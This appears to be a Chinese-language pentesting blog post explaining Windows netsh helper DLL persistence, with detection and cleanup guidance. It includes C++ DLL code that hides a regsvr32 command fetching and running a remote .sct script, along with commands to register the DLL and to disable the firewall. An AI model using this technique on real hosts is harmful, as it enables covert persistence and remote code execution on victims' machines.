---
layout: post
title: Netsh persistence
---



**About:**

- Common commands of netsh
- Matthew Demaske's way of using netshell to execute evil dlls and persist on a host
- Write a dll with the InitHelperDll function
- How to use
- Detection

**目录：**

- 介绍netsh的常用命令
- 测试Matthew Demaske分享的方法——using netshell to execute evil dlls and persist on a host
- 如何使用c++编写导出函数为InitHelperDll的helper dll
- 实际测试利用
- 防御和检测

**Reference:**

http://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/


##0x00 简介

在渗透测试中，使用系统中默认支持的命令常常可以绕过各种检测和拦截，比如我在《Use bitsadmin to maintain persistence and bypass Autoruns》中介绍过如何利用系统默认支持的bitsadmin来实现自启动，并绕过Autoruns的检测。

Matthew Demaske在最近分享了一个他发现的方法，同样是利用系统中默认支持的命令——using netshell to execute evil dlls and persist on a host，本文将对其方法进行整理，并补全文中未具体介绍的dll编写方法


##0x01 netsh简介

是windows系统本身提供的功能强大的网络配置命令行工具，常用命令如下：

查看ip配置信息：
```netsh interface ip show config```

查看网络配置文件：
```netsh -c interface dump```

开/关网卡：
```netsh int set int name="ethernet" admin=enabled```
```netsh int set int name="ethernet" admin=disabled```

查看所有tcp连接：
```netsh interface ip show tcpconnections```

设置本机ip、子网掩码、网关ip：
```netsh interface ip set address "Local Area Connection" static 192.168.1.2 255.255.255.0 192.168.1.1```

查看防火墙状态：
```netsh firewall show state```

开/关防火墙：

```netsh firewall set opmode enable```

```netsh firewall set opmode disable```


输入netsh /?可查看更详细的命令帮助，其中add命令值得注意，输入netsh add /?获得更详细内容：

```
netsh add /?
The following commands are available:
Commands in this context:
add helper - Installs a helper DLL.
```


如果在此添加一个测试dll，结果会怎样呢？


##0x02 编写helper DLL

每个helper DLL都需要包含导出函数InitHelperDll

在添加helper DLL后，每次netsh在初始加载的时候会调用该helper DLL中的导出函数InitHelperDll

InitHelperDll示例如下：


```
DWORD
WINAPI
InitHelperDll(
    DWORD      dwNetshVersion,
    PVOID      pReserved
)
{
    NS_HELPER_ATTRIBUTES attMyAttributes;

    attMyAttributes.guidHelper = g_MyGuid;
    attMyAttributes.dwVersion  = 1;
    attMyAttributes.pfnStart   = NetshStartHelper;
    RegisterHelper( NULL, &attMyAttributes );
    return NO_ERROR;
}
```



关于InitHelperDll的细节可参照如下链接：

https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx


在《Code Execution of Regsvr32.exe》曾具体介绍过如何为dll添加一个导出函数，所以在这里接着简单介绍一下：



新建c++工程，创建一个dll项目 在主文件添加:


```
DWORD WINAPI InitHelperDll(DWORD dwNetshVersion,PVOID pReserved)
{
	char *command="cmd.exe /c start regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll";
    WinExec(command,SW_HIDE); 
	return 0;
}
```

添加导出函数声明:

文件类型：

Text File

名称：

同名文件.def


写入

EXPORTS
InitHelperDll





编译即可

**注：**

Marc Smeets分享了他的POC代码，定义导出函数使用的是另一种方式:

```
extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
```

payload为创建新线程执行shellcode

**项目地址如下：**

https://github.com/outflankbv/NetshHelperBeacon


##0x03 添加自定义helper dll

**注：**

需要管理员权限

通过cmd添加:

```netsh add helper c:\test\netshtest.dll```

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-29/2-1.png)


如下图，注册表同步创建键值

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-29/2-2.png)

位置：```HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh```

名称：```netshtest```

类型：```REG_SZ```

数据：```c:\test\netshtest.dll```

**注：**

通过注册表直接添加键值同netsh add 添加helper dll的作用一样



##0x04 触发后门

helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll

如图，运行netsh命令，加载c:\test\netshtest.dll，弹出计算器

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-29/2-3.png)


验证：
- 使用Process Explorer查看netsh进程加载的dll

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-29/3-1.png)



- 使用Process Monitor在进程属性Event Properties也可以查看

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-29/3-2.png)



##0x05 Persistence

- netsh作为系统常用命令，存在被用户正常使用的概率，所以只要启动netsh即可触发payload

- 如果被添加为常用的开机启动项，也很有迷惑性，因为显示的仅仅是启动netsh.exe

##0x06 检测

监控注册表位置```HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh```

**注：**

- netsh show helper命令并不能查到新添加的helper dll

- 需要留意注册表内正常的dll是否被替换



##0x07 清除

通过cmd:

```netsh delete helper c:\test\netshtest.dll```

通过注册表:

```在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh删除对应键值```




##0x08 小结

- Netsh Persistence实现的前提是已经获得了管理员权限

- 部分vpn软件在启动过程中会调用netsh命令，这样就解决了Netsh Persistence的自启动问题，该方法值得测试

- 如果在开机启动项中发现有netsh，值得留意，需要查看对应注册表键值中是否包含恶意的helper dll

- 不同系统中注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh下的默认键值存在差异，需要对比查找默认键值是否被篡改
